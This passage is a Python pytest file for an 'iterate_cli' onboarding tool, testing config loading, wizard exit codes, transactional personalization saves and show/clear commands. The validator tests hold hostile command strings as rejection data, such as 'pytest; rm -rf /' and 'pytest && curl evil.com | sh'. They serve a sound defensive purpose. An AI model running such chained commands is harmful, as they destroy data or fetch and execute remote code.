        """A YAML list in the config must not crash callers (M-11-1)."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        config_path = fake_project / "iterate.config.yaml"
        config_path.write_text("- item1\n- item2\n", encoding="utf-8")

        result = load_onboarding_config(fake_project)
        assert result is None
        captured = capsys.readouterr()
        assert "not a YAML mapping" in captured.err

    def test_returns_none_on_yaml_scalar(self, fake_project: Path, capsys) -> None:
        """A YAML scalar in the config must not crash callers (M-11-1)."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        config_path = fake_project / "iterate.config.yaml"
        config_path.write_text("just a string\n", encoding="utf-8")

        result = load_onboarding_config(fake_project)
        assert result is None
        captured = capsys.readouterr()
        assert "not a YAML mapping" in captured.err

    def test_empty_file_returns_none(self, fake_project: Path) -> None:
        """An empty config file returns None (not a crash)."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        config_path = fake_project / "iterate.config.yaml"
        config_path.write_text("", encoding="utf-8")

        result = load_onboarding_config(fake_project)
        # Empty file → yaml.safe_load returns None → callers use ``or {}``.
        assert result is None

    def test_incremental_refresh_refuses_corrupt_config(
        self, fake_project: Path, capsys
    ) -> None:
        """incremental_refresh must refuse to run when config is a YAML list.

        Previously refresh absorbed a non-dict/corrupt config via ``or {}`` and
        silently rewrote the file with empty defaults, destroying the user's
        customised fields. Now it aborts (False) rather than overwriting.
        """
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        # Corrupt the config into a YAML list.
        config_path = fake_project / "iterate.config.yaml"
        config_path.write_text("- not a dict\n", encoding="utf-8")

        # A corrupt config must NOT be silently overwritten with defaults.
        result = incremental_refresh(fake_project)
        assert result is False
        # The corrupt file is left untouched.
        assert config_path.read_text(encoding="utf-8") == "- not a dict\n"


class TestLoadExistingOnboardingDataNonDict:
    """Tests for _load_existing_onboarding_data with non-dict YAML (M-11-2)."""

    def test_returns_none_on_yaml_list(self, fake_project: Path, capsys) -> None:
        """A YAML list in the config must return None, not crash (M-11-2)."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        config_path = fake_project / "iterate.config.yaml"
        config_path.write_text("- item1\n- item2\n", encoding="utf-8")

        from iterate_cli.wizard import _load_existing_onboarding_data
        result = _load_existing_onboarding_data(fake_project)
        assert result is None
        captured = capsys.readouterr()
        assert "not a YAML mapping" in captured.err

    def test_returns_none_on_yaml_scalar(self, fake_project: Path, capsys) -> None:
        """A YAML scalar in the config must return None, not crash (M-11-2)."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        config_path = fake_project / "iterate.config.yaml"
        config_path.write_text("just a string\n", encoding="utf-8")

        from iterate_cli.wizard import _load_existing_onboarding_data
        result = _load_existing_onboarding_data(fake_project)
        assert result is None
        captured = capsys.readouterr()
        assert "not a YAML mapping" in captured.err


class TestCmdOnboardNoChangesExitCode:
    """Tests for _cmd_onboard exit code: cancelled vs no-changes (M-11-3, M-14-1)."""

    def test_returns_zero_when_no_changes_and_onboarding_complete(
        self, fake_project: Path, monkeypatch, capsys
    ) -> None:
        """Returning user who declines both should get exit 0, not 1 (M-11-3)."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        # Simulate returning user declining both basic update and
        # personalization. The wizard returns NO_CHANGES_NEEDED.
        monkeypatch.setattr(
            "iterate_cli.cli.run_wizard", lambda project_root: NO_CHANGES_NEEDED
        )

        ret = cli_main(["onboard", "-p", str(fake_project)])
        assert ret == 0
        captured = capsys.readouterr()
        assert "No changes made" in captured.out

    def test_returns_one_when_cancelled_and_not_onboarded(
        self, fake_project: Path, monkeypatch
    ) -> None:
        """First-time user who cancels should still get exit 1."""
        # No ITERATE.md → first-time flow. None means cancelled.
        monkeypatch.setattr(
            "iterate_cli.cli.run_wizard", lambda project_root: None
        )

        ret = cli_main(["onboard", "-p", str(fake_project)])
        assert ret == 1

    def test_returns_one_when_cancelled_mid_wizard_with_iterate_md(
        self, fake_project: Path, monkeypatch
    ) -> None:
        """Returning user who starts update but cancels mid-wizard → exit 1 (M-14-1).

        Previously, _cmd_onboard returned 0 whenever ITERATE.md existed and
        run_wizard returned None, conflating "declined all" with "cancelled
        mid-wizard". The NO_CHANGES_NEEDED sentinel fixes this.
        """
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        # Simulate user accepting "update basic config" then cancelling
        # mid-wizard. run_wizard returns None (cancelled), NOT sentinel.
        monkeypatch.setattr(
            "iterate_cli.cli.run_wizard", lambda project_root: None
        )

        ret = cli_main(["onboard", "-p", str(fake_project)])
        assert ret == 1


class TestCmdOnboardPreservesUserSections:
    """Returning-user ``onboard`` must preserve the ITERATE.md user-owned section.

    Regression: re-onboarding an existing project previously overwrote the
    user-owned section with the default (or personalization) content, losing
    manual edits. ``write_onboarding_outputs`` now accepts the existing
    ITERATE.md content and reuses its user-owned section.
    """

    def test_basic_update_preserves_user_section(
        self, fake_project: Path, monkeypatch
    ) -> None:
        """Returning user updates basic config → manual user edits survive."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        # Add a manual edit to the user-owned section of ITERATE.md.
        md_path = fake_project / "ITERATE.md"
        md = md_path.read_text(encoding="utf-8")
        md = md.replace(
            "## 手动批注 / Manual Annotations",
            "## 手动批注 / Manual Annotations\n\n手动添加的内容 - must be preserved",
        )
        md_path.write_text(md, encoding="utf-8")

        # Simulate a returning user who updates basic config (returns a fresh
        # OnboardingData with no personalization).
        monkeypatch.setattr(
            "iterate_cli.cli.run_wizard",
            lambda project_root: _build_onboarding_data(project_root),
        )

        ret = cli_main(["onboard", "-p", str(fake_project)])
        assert ret == 0

        after = md_path.read_text(encoding="utf-8")
        assert "手动添加的内容 - must be preserved" in after

    def test_basic_update_with_personalization_merges_content(
        self, fake_project: Path, monkeypatch
    ) -> None:
        """Returning user updates basic + personalizes → edits + new notes survive."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        md_path = fake_project / "ITERATE.md"
        md = md_path.read_text(encoding="utf-8")
        md = md.replace(
            "## 手动批注 / Manual Annotations",
            "## 手动批注 / Manual Annotations\n\n手动内容 - keep",
        )
        md_path.write_text(md, encoding="utf-8")

        fresh = _build_onboarding_data(fake_project)
        fresh.personalization = PersonalizationData(
            iterate_notes=["新注意点 - reflected"],
        )

        monkeypatch.setattr(
            "iterate_cli.cli.run_wizard", lambda project_root: fresh
        )

        ret = cli_main(["onboard", "-p", str(fake_project)])
        assert ret == 0

        after = md_path.read_text(encoding="utf-8")
        assert "手动内容 - keep" in after
        assert "新注意点 - reflected" in after


class TestCmdOnboardPreservesConfigPersonalization:
    """Returning-user ``onboard`` must preserve ``personalization`` in config.yaml.

    Regression: when a returning user updates basic config via ``onboard`` but
    declines to re-personalize, the config.yaml was regenerated from scratch and
    the existing ``personalization`` section (structured rules: protected paths,
    risk areas, extra validation commands, etc.) was silently dropped.
    """

    def test_basic_update_preserves_existing_personalization(
        self, fake_project: Path, monkeypatch
    ) -> None:
        """Returning user updates basic config only → structured rules survive."""
        data = _build_onboarding_data(fake_project)
        data.personalization = PersonalizationData(
            protected_paths=["legacy/**"],
            extra_validation_commands={"python": ["ruff check src/"]},
        )
        write_onboarding_outputs(data, fake_project)

        # Confirm personalization exists in config before re-onboarding.
        config = load_onboarding_config(fake_project)
        assert config["personalization"]["protected_paths"] == ["legacy/**"]

        # Returning user updates basic config but returns no personalization.
        monkeypatch.setattr(
            "iterate_cli.cli.run_wizard",
            lambda project_root: _build_onboarding_data(project_root),
        )

        ret = cli_main(["onboard", "-p", str(fake_project)])
        assert ret == 0

        # Personalization structured rules must survive the basic-config update.
        config = load_onboarding_config(fake_project)
        assert config["personalization"]["protected_paths"] == ["legacy/**"]
        assert config["personalization"]["extra_validation_commands"] == {
            "python": ["ruff check src/"]
        }


class TestValidateExtraCommand:
    """Tests for iterate_cli.personalize.validate_extra_command (v2.0.1).

    Covers whitelist acceptance, blacklist rejection of shell-chaining
    metacharacters, unknown-prefix warning, and the python -m indirect
    invocation form. Security regression guard for the ClawHub
    Context-Inappropriate Capability / Intent-Code Divergence findings.
    """

    def test_empty_command_rejected(self) -> None:
        is_valid, reason = validate_extra_command("")
        assert is_valid is False
        assert "empty" in reason

    def test_whitespace_only_command_rejected(self) -> None:
        is_valid, reason = validate_extra_command("   ")
        assert is_valid is False
        assert "empty" in reason

    @pytest.mark.parametrize(
        "cmd",
        [
            "pytest",
            "pytest -x",
            "pytest tests/test_onboarding.py -v",
            "ruff check .",
            "mypy iterate_cli/",
            "bandit -r src/",
            "npm test",
            "npm run lint",
            "tsc --noEmit",
            "eslint src/ --ext .ts",
            "swift build -c debug",
            "cargo test",
            "go test ./...",
            "make test",
            "pre-commit run --all-files",
        ],
    )
    def test_known_safe_commands_accepted(self, cmd: str) -> None:
        is_valid, reason = validate_extra_command(cmd)
        assert is_valid is True
        assert reason == ""  # no warning for whitelisted commands

    @pytest.mark.parametrize(
        "cmd",
        [
            "python -m pytest",
            "python -m pytest -x",
            "python3 -m mypy iterate_cli/",
            "py -m ruff check .",
        ],
    )
    def test_python_m_indirect_form_accepted(self, cmd: str) -> None:
        is_valid, reason = validate_extra_command(cmd)
        assert is_valid is True
        assert reason == ""

    @pytest.mark.parametrize(
        "cmd",
        [
            "pytest; rm -rf /",
            "pytest && curl evil.com | sh",
            "ruff check . | tee log.txt",
            "mypy `cat files.txt`",
            "npm test > output.log",
            "cargo test < input.txt",
            "eslint . &",
            "pytest\nclean_repo()",
            "pytest\rclean_repo()",
            "pytest $HOME/evil",
        ],
    )
    def test_shell_metacharacters_rejected(self, cmd: str) -> None:
        is_valid, reason = validate_extra_command(cmd)
        assert is_valid is False
        assert "forbidden" in reason.lower() or "metacharacter" in reason.lower()

    @pytest.mark.parametrize(
        "cmd",
        [
            "safety check",
            "custom-script --flag",
            "./bin/run-tests",
            "bash run.sh",
            "sh test.sh",
        ],
    )
    def test_unknown_prefix_rejected(self, cmd: str) -> None:
        """v2.0.2: unknown prefixes are rejected, not warned+accepted."""
        is_valid, reason = validate_extra_command(cmd)
        assert is_valid is False
        assert "known-safe" in reason or "pre-approved" in reason

    def test_python_m_with_unknown_module_rejected(self) -> None:
        """v2.0.2: python -m with unknown module is rejected."""
        is_valid, reason = validate_extra_command("python -m evil_module")
        assert is_valid is False
        assert "known-safe" in reason or "pre-approved" in reason

    def test_python_m_with_metacharacter_rejected(self) -> None:
        is_valid, reason = validate_extra_command("python -m pytest; rm -rf /")
        assert is_valid is False
        assert "forbidden" in reason.lower() or "metacharacter" in reason.lower()

    def test_known_safe_prefix_not_bypassed_by_metachar(self) -> None:
        """Even pytest cannot bypass the metacharacter check."""
        is_valid, _ = validate_extra_command("pytest; rm -rf /")
        assert is_valid is False


class TestOperatorExtraPrefixes:
    """Tests for the operator-level env extension point (problem-5 fix).

    The env var lets an operator add safe prefixes without editing source,
    while remaining fail-closed: tokens with shell metacharacters are
    dropped, and the default (env unset) keeps the strict built-in list.
    """

    def test_env_unset_returns_empty(self, monkeypatch) -> None:
        monkeypatch.delenv(EXTRA_SAFE_PREFIXES_ENV, raising=False)
        assert _operator_extra_prefixes() == ()

    def test_env_empty_returns_empty(self, monkeypatch) -> None:
        monkeypatch.setenv(EXTRA_SAFE_PREFIXES_ENV, "   ")
        assert _operator_extra_prefixes() == ()

    def test_env_parses_tokens(self, monkeypatch) -> None:
        monkeypatch.setenv(
            EXTRA_SAFE_PREFIXES_ENV, "safety, sqlfluff   hadolint"
        )
        assert _operator_extra_prefixes() == ("safety", "sqlfluff", "hadolint")

    def test_env_drops_metachar_tokens(self, monkeypatch) -> None:
        """Fail-closed: a malicious token is silently dropped, not trusted."""
        monkeypatch.setenv(
            EXTRA_SAFE_PREFIXES_ENV, "safety;rm -rf /,sqlfluff;curl evil|sh"
        )
        assert _operator_extra_prefixes() == ()

    def test_env_extends_whitelist(self, monkeypatch) -> None:
        """Operator-approved prefix becomes acceptable for validation."""
        monkeypatch.setenv(EXTRA_SAFE_PREFIXES_ENV, "safety")
        is_valid, reason = validate_extra_command("safety check --full")
        assert is_valid is True
        assert reason == ""

    def test_env_extended_prefix_still_rejects_metachar(self, monkeypatch) -> None:
        """Even an operator-approved prefix cannot bypass metachar checks."""
        monkeypatch.setenv(EXTRA_SAFE_PREFIXES_ENV, "safety")
        is_valid, _ = validate_extra_command("safety check; rm -rf /")
        assert is_valid is False

    def test_env_python_m_extension(self, monkeypatch) -> None:
        """python -m form also honors operator-extended prefixes."""
        monkeypatch.setenv(EXTRA_SAFE_PREFIXES_ENV, "safety")
        is_valid, reason = validate_extra_command("python -m safety check")
        assert is_valid is True
        assert reason == ""


# ---------------------------------------------------------------------------
# Transactional personalization save (G3/G4) tests
# ---------------------------------------------------------------------------


class TestSavePersonalizationTransactional:
    """Tests for the transactional ``save_personalization`` (both files, rollback).

    Guarantees: config and ITERATE.md are written atomically; if the second
    write fails, the already-written config is rolled back to its prior content
    so the two files never diverge; if rollback itself fails that is surfaced
    (not silently swallowed).
    """

    def test_writes_both_files(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        personalization = PersonalizationData(
            protected_paths=["legacy/**"],
            iterate_notes=["不要修改迁移文件"],
        )
        config_path, iterate_md_path = save_personalization(fake_project, personalization)

        assert config_path == fake_project / "iterate.config.yaml"
        assert iterate_md_path == fake_project / "ITERATE.md"

        config = yaml.safe_load(config_path.read_text(encoding="utf-8"))
        assert config["personalization"]["protected_paths"] == ["legacy/**"]
        assert "不要修改迁移文件" in iterate_md_path.read_text(encoding="utf-8")

    def test_skips_iterate_md_when_absent(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)
        (fake_project / "ITERATE.md").unlink()

        personalization = PersonalizationData(protected_paths=["legacy/**"])
        config_path, iterate_md_path = save_personalization(fake_project, personalization)

        assert config_path.is_file()
        assert not iterate_md_path.exists()
        config = yaml.safe_load(config_path.read_text(encoding="utf-8"))
        assert config["personalization"]["protected_paths"] == ["legacy/**"]

    def test_raises_on_missing_config(self, empty_project: Path) -> None:
        with pytest.raises(FileNotFoundError):
            save_personalization(empty_project, PersonalizationData(protected_paths=["x"]))

    def test_rolls_back_config_when_iterate_md_write_fails(
        self, fake_project: Path, monkeypatch, capsys
    ) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)
        original_config = (fake_project / "iterate.config.yaml").read_text(encoding="utf-8")

        from iterate_cli.generator import atomic_write as _orig_aw

        def failing_md_write(path, content, encoding="utf-8"):
            if Path(path).name == "ITERATE.md":
                raise OSError("md write boom")
            return _orig_aw(path, content, encoding)

        monkeypatch.setattr("iterate_cli.generator.atomic_write", failing_md_write)

        with pytest.raises(OSError, match="md write boom"):
            save_personalization(
                fake_project, PersonalizationData(protected_paths=["legacy/**"])
            )

        # Config must be rolled back to its exact prior content.
        assert (fake_project / "iterate.config.yaml").read_text(encoding="utf-8") == original_config

    def test_surfaces_rollback_failure(
        self, fake_project: Path, monkeypatch, capsys
    ) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        from iterate_cli.generator import atomic_write as _orig_aw

        # First config write succeeds, ITERATE.md fails (triggers rollback),
        # then the rollback config write also fails.
        config_writes = {"n": 0}

        def failing_write(path, content, encoding="utf-8"):
            p = Path(path)
            if p.name == "ITERATE.md":
                raise OSError("md write boom")
            config_writes["n"] += 1
            if config_writes["n"] > 1:
                raise OSError("rollback boom")
            return _orig_aw(path, content, encoding)

        monkeypatch.setattr("iterate_cli.generator.atomic_write", failing_write)

        with pytest.raises(OSError):
            save_personalization(
                fake_project, PersonalizationData(protected_paths=["legacy/**"])
            )
        captured = capsys.readouterr()
        assert "roll back" in captured.err


# ---------------------------------------------------------------------------
# Advanced configuration wizard (G1) tests
# ---------------------------------------------------------------------------


class TestAdvancedConfigWizard:
    """Tests for the optional advanced-configuration onboarding step (G1).

    Verifies that opting out leaves defaults untouched, opting in mutates each
    of the 8 tuning knobs, and the read-helper boundaries enforce the same
    constraints as config.schema.json.
    """

    def test_decline_keeps_defaults(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        responses = iter(["n"])  # don't configure advanced options
        _optionally_collect_advanced_config(data, input_func=lambda _: next(responses))
        assert data.goal == DEFAULT_GOAL
        assert data.max_rounds == DEFAULT_MAX_ROUNDS
        assert data.language == "en"
        assert data.use_worktree is False
        assert data.auto_merge is False
        assert data.output_schema_validation is True
        assert data.drift_ignore == []

    def test_accept_mutates_all_fields(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        responses = iter([
            "y",  # configure advanced options
            "Ship quality",  # goal
            "10",  # max_rounds
            "high",  # reasoning_effort
            "zh",  # language
            "5",  # atomic_max_lines
            "2",  # atomic_max_adjacent_methods
            "y",  # use_worktree
            "y",  # auto_merge
            "n",  # output_schema_validation
            "package-lock.json, yarn.lock",  # drift_ignore
        ])
        _optionally_collect_advanced_config(data, input_func=lambda _: next(responses))
        assert data.goal == "Ship quality"
        assert data.max_rounds == 10
        assert data.reasoning_effort == "high"
        assert data.language == "zh"
        assert data.atomic_max_lines == 5
        assert data.atomic_max_adjacent_methods == 2
        assert data.use_worktree is True
        assert data.auto_merge is True
        assert data.output_schema_validation is False
        assert data.drift_ignore == ["package-lock.json", "yarn.lock"]

    def test_accept_keep_all_empty_inputs(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        responses = iter([
            "y",  # configure advanced options
            "",   # goal (keep)
            "",   # max_rounds (keep)
            "",   # reasoning_effort (keep)
            "",   # language (keep)
            "",   # atomic_max_lines (keep)
            "",   # atomic_max_adjacent_methods (keep)
            "n",  # use_worktree
            "n",  # auto_merge
            "y",  # output_schema_validation
            "",   # drift_ignore (keep)
        ])
        _optionally_collect_advanced_config(data, input_func=lambda _: next(responses))
        assert data.goal == DEFAULT_GOAL
        assert data.max_rounds == DEFAULT_MAX_ROUNDS
        assert data.reasoning_effort is None
        assert data.language == "en"
        assert data.atomic_max_lines == DEFAULT_ATOMIC_MAX_LINES
        assert data.atomic_max_adjacent_methods == DEFAULT_ATOMIC_MAX_ADJACENT_METHODS
        assert data.use_worktree is False
        assert data.auto_merge is False
        assert data.output_schema_validation is True
        assert data.drift_ignore == []

    # -- _read_optional_int boundaries (mirror config.schema.json constraints) --

    def test_read_optional_int_keeps_current_on_empty(self) -> None:
        assert _read_optional_int("p", 7, 1, 50, lambda _: "") == 7

    def test_read_optional_int_keeps_current_below_min(self) -> None:
        assert _read_optional_int("p", 7, 1, 50, lambda _: "0") == 7

    def test_read_optional_int_keeps_current_above_max(self) -> None:
        assert _read_optional_int("p", 7, 1, 50, lambda _: "51") == 7

    def test_read_optional_int_keeps_current_on_invalid(self) -> None:
        assert _read_optional_int("p", 7, 1, 50, lambda _: "abc") == 7

    def test_read_optional_int_returns_valid_value(self) -> None:
        assert _read_optional_int("p", 7, 1, 50, lambda _: "10") == 10

    def test_read_optional_int_no_upper_bound(self) -> None:
        assert _read_optional_int("p", 7, 1, None, lambda _: "200") == 200

    def test_read_optional_int_rejects_boundary_max(self) -> None:
        # 50 is the hard cap; 50 is accepted, 51 rejected (tested above).
        assert _read_optional_int("p", 7, 1, 50, lambda _: "50") == 50

    # -- _read_language --

    def test_read_language_keeps_on_empty(self) -> None:
        assert _read_language("en", lambda _: "") == "en"

    def test_read_language_valid(self) -> None:
        assert _read_language("en", lambda _: "zh") == "zh"

    def test_read_language_invalid_then_valid(self) -> None:
        responses = iter(["fr", "en"])
        assert _read_language("zh", lambda _: next(responses)) == "en"

    # -- _read_reasoning_effort --

    def test_read_reasoning_effort_keeps_on_empty(self) -> None:
        assert _read_reasoning_effort("low", lambda _: "") == "low"
        assert _read_reasoning_effort(None, lambda _: "") is None

    def test_read_reasoning_effort_valid(self) -> None:
        assert _read_reasoning_effort(None, lambda _: "high") == "high"
        assert _read_reasoning_effort("low", lambda _: "medium") == "medium"

    def test_read_reasoning_effort_is_case_insensitive(self) -> None:
        assert _read_reasoning_effort(None, lambda _: "HIGH") == "high"

    def test_read_reasoning_effort_invalid_then_valid(self) -> None:
        responses = iter(["turbo", "low"])
        assert _read_reasoning_effort(None, lambda _: next(responses)) == "low"

    # -- _read_optional_text --

    def test_read_optional_text_keeps_on_empty(self) -> None:
        assert _read_optional_text("goal", "current", lambda _: "") == "current"

    def test_read_optional_text_replaces(self) -> None:
        assert _read_optional_text("goal", "current", lambda _: "new") == "new"

    # -- _read_drift_ignore --

    def test_read_drift_ignore_keeps_on_empty(self) -> None:
        assert _read_drift_ignore(["a"], lambda _: "") == ["a"]

    def test_read_drift_ignore_dedupes_and_trims(self) -> None:
        assert _read_drift_ignore([], lambda _: " a, a ,b") == ["a", "b"]


# ---------------------------------------------------------------------------
# iterate show (read-only resolved config + personalization) tests
# ---------------------------------------------------------------------------


class TestShowCommand:
    """Tests for the ``iterate show`` read-only inspection command."""

    def test_show_not_onboarded(self, empty_project: Path, capsys) -> None:
        ret = cli_main(["show", "-p", str(empty_project)])
        assert ret == 0
        captured = capsys.readouterr()
        assert "Not onboarded" in captured.out

    def test_show_onboarded_with_personalization(
        self, fake_project: Path, capsys
    ) -> None:
        data = _build_onboarding_data(fake_project)
        data.personalization = PersonalizationData(
            protected_paths=["legacy/**"],
            risk_areas=[RiskArea(path="src/auth/", reason="auth logic")],
            code_conventions=["Use snake_case"],
            iterate_notes=["Handle migration carefully"],
            extra_validation_commands={"python": ["bandit -r src/"]},
        )
        write_onboarding_outputs(data, fake_project)

        ret = cli_main(["show", "-p", str(fake_project)])
        assert ret == 0
        captured = capsys.readouterr()
        assert "Resolved Config" in captured.out
        assert "Personalization" in captured.out
        assert "legacy/**" in captured.out
        assert "src/auth/" in captured.out
        assert "Use snake_case" in captured.out
        assert "bandit -r src/" in captured.out

    def test_show_surfaces_reasoning_effort(self, fake_project: Path, capsys) -> None:
        data = _build_onboarding_data(fake_project)
        data.reasoning_effort = "high"
        write_onboarding_outputs(data, fake_project)

        ret = cli_main(["show", "-p", str(fake_project)])
        assert ret == 0
        captured = capsys.readouterr()
        assert "Reasoning Effort" in captured.out
        assert "high" in captured.out

    def test_show_json_reasoning_effort(self, fake_project: Path, capsys) -> None:
        from iterate_cli.show import collect_show_data

        data = _build_onboarding_data(fake_project)
        data.reasoning_effort = "medium"
        write_onboarding_outputs(data, fake_project)

        report = collect_show_data(fake_project)
        assert report["config"]["reasoning_effort"] == "medium"

    def test_show_json(self, fake_project: Path, capsys) -> None:
        data = _build_onboarding_data(fake_project)
        data.personalization = PersonalizationData(protected_paths=["legacy/**"])
        write_onboarding_outputs(data, fake_project)

        ret = cli_main(["show", "-p", str(fake_project), "--json"])
        assert ret == 0
        captured = capsys.readouterr()
        import json

        report = json.loads(captured.out)
        assert report["onboarded"] is True
        assert "onboarding" in report

    def test_show_surfaces_drift_advice(
        self, fake_project: Path, capsys, monkeypatch
    ) -> None:
        """When drift is detected, show surfaces the actionable advice (parity
        with ``iterate status``) in both TUI and JSON outputs."""
        import iterate_cli.show as show_mod
        from iterate_cli.fingerprint import DriftResult
        from iterate_cli.show import collect_show_data

        fake_drift = DriftResult(changed=["pyproject.toml"])
        monkeypatch.setattr(
            show_mod, "check_onboarding_drift", lambda _root: fake_drift
        )

        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        data = collect_show_data(fake_project)
        assert data["drift"] == fake_drift.summary()
        assert data["drift_advice"] == fake_drift.advice()

        ret = cli_main(["show", "-p", str(fake_project)])
        assert ret == 0
        captured = capsys.readouterr().out
        assert "Drift:" in captured
        assert "iterate refresh" in captured

    def test_show_json_includes_drift_advice(
        self, fake_project: Path, capsys, monkeypatch
    ) -> None:
        import json

        import iterate_cli.show as show_mod
        from iterate_cli.fingerprint import DriftResult

        fake_drift = DriftResult(added=["pnpm-lock.yaml"])
        data = _build_onboarding_data(fake_project)
        data.personalization = PersonalizationData(protected_paths=["legacy/**"])
        write_onboarding_outputs(data, fake_project)
        monkeypatch.setattr(
            show_mod, "check_onboarding_drift", lambda _root: fake_drift
        )
        ret = cli_main(["show", "-p", str(fake_project), "--json"])
        assert ret == 0
        report = json.loads(capsys.readouterr().out)
        assert report["drift_advice"] == fake_drift.advice()
        assert "config" in report
        assert report["personalization"]["protected_paths"] == ["legacy/**"]

    def test_show_without_personalization(self, fake_project: Path, capsys) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        ret = cli_main(["show", "-p", str(fake_project)])
        assert ret == 0
        captured = capsys.readouterr()
        assert "Personalization" in captured.out
        assert "none set" in captured.out


# ---------------------------------------------------------------------------
# personalize --clear tests
# ---------------------------------------------------------------------------


class TestPersonalizeClear:
    """Tests for ``iterate personalize --clear``."""

    def test_remove_personalization_from_config_keeps_base_commands(self) -> None:
        from iterate_cli.personalize import remove_personalization_from_config

        config = {
            "personalization": {
                "version": "1.0",
                "protected_paths": ["legacy/**"],
                "extra_validation_commands": {"python": ["bandit -r src/"]},
            },
            "validation": {
                "command_whitelist": ["ruff", "bandit"],
                "commands": {
                    "python": ["ruff check src/", "bandit -r src/"],
                },
            },
        }
        result = remove_personalization_from_config(config)
        assert "personalization" not in result
        # Base command preserved, personalization-owned command removed.
        assert result["validation"]["commands"] == {"python": ["ruff check src/"]}
        # Whitelist untouched (harmless allowlist).
        assert "bandit" in result["validation"]["command_whitelist"]

    def test_remove_personalization_drops_empty_module(self) -> None:
        from iterate_cli.personalize import remove_personalization_from_config

        config = {
            "personalization": {
                "extra_validation_commands": {"go": ["go vet ./..."]},
            },
            "validation": {
                "command_whitelist": ["go"],
                "commands": {"go": ["go vet ./..."]},
            },
        }
        result = remove_personalization_from_config(config)
        assert "personalization" not in result
        assert "go" not in result["validation"]["commands"]

    def test_clear_personalization_via_cli(self, fake_project: Path) -> None:
        from iterate_cli.personalize import save_personalization

        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)
        save_personalization(
            fake_project,
            PersonalizationData(
                protected_paths=["legacy/**"],
                code_conventions=["Use snake_case"],
                extra_validation_commands={"python": ["bandit -r src/"]},
            ),
        )

        # Use --yes to skip the interactive confirmation.
        ret = cli_main(["personalize", "-p", str(fake_project), "--clear", "--yes"])
        assert ret == 0

        config = yaml.safe_load(
            (fake_project / "iterate.config.yaml").read_text(encoding="utf-8")
        )
        assert "personalization" not in config

        iterate_md = (fake_project / "ITERATE.md").read_text(encoding="utf-8")
        assert "legacy/**" not in iterate_md
        assert "Use snake_case" not in iterate_md

    def test_clear_cancel_does_nothing(self, fake_project: Path, monkeypatch, capsys) -> None:
        from iterate_cli.personalize import save_personalization

        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)
        save_personalization(
            fake_project, PersonalizationData(protected_paths=["legacy/**"])
        )

        # Simulate the user declining the confirmation prompt.
        monkeypatch.setattr(
            "iterate_cli.wizard._ask_yes_no", lambda *a, **k: False
        )
        ret = cli_main(["personalize", "-p", str(fake_project), "--clear"])
        assert ret == 0

        config = yaml.safe_load(
            (fake_project / "iterate.config.yaml").read_text(encoding="utf-8")
        )
        assert "personalization" in config  # untouched

    def test_clear_nothing_to_clear(self, fake_project: Path, capsys) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        ret = cli_main(["personalize", "-p", str(fake_project), "--clear", "--yes"])
        assert ret == 0
        captured = capsys.readouterr()
        assert "No personalization to clear" in captured.out

    def test_has_personalization_true_when_sections_exist(
        self, fake_project: Path
    ) -> None:
        from iterate_cli.personalize import has_personalization

        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)
        config = load_onboarding_config(fake_project) or {}
        assert has_personalization(fake_project, config) is False

        # Free-form notes in ITERATE.md count even with no structured config.
        from iterate_cli.personalize import save_personalization

        save_personalization(
            fake_project, PersonalizationData(iterate_notes=["Handle carefully"])
        )
        config = load_onboarding_config(fake_project) or {}
        assert has_personalization(fake_project, config) is True


# ---------------------------------------------------------------------------
# Regression: data-protection & personalization guards (P1 fixes)
# ---------------------------------------------------------------------------


class TestAtomicWritePreservesPermissions:
    def test_mode_bits_preserved(self, tmp_path: Path) -> None:
        from iterate_cli.generator import atomic_write

        target = tmp_path / "iterate.config.yaml"
        target.write_text("old", encoding="utf-8")
        # Simulate a config the operator restricted to owner-only.
        target.chmod(0o600)
        atomic_write(target, "new content")
        assert (target.stat().st_mode & 0o777) == 0o600

    def test_new_file_uses_umask_default(self, tmp_path: Path) -> None:
        from iterate_cli.generator import atomic_write

        target = tmp_path / "fresh.yaml"
        atomic_write(target, "content")
        assert target.read_text(encoding="utf-8") == "content"


class TestProtectedPathsScalarGuard:
    def test_scalar_protected_paths_not_split_into_chars(self) -> None:
        """`protected_paths: "legacy"` must degrade to [] (not ['l','e','g',...])."""
        data = load_personalization_from_config(
            {"personalization": {"protected_paths": "legacy"}}
        )
        assert data.protected_paths == []

    def test_list_protected_paths_parsed(self) -> None:
        data = load_personalization_from_config(
            {"personalization": {"protected_paths": ["legacy/**", "vendor/**"]}}
        )
        assert data.protected_paths == ["legacy/**", "vendor/**"]


class TestCoerceLineNumber:
    def test_float_fractional_falls_back_to_zero(self) -> None:
        from iterate_cli.personalize import _coerce_line_number

        assert _coerce_line_number(1.5) == 0

    def test_float_integral_kept(self) -> None:
        from iterate_cli.personalize import _coerce_line_number

        assert _coerce_line_number(3.0) == 3

    def test_string_and_negative_clamped(self) -> None:
        from iterate_cli.personalize import _coerce_line_number

        assert _coerce_line_number("12") == 12
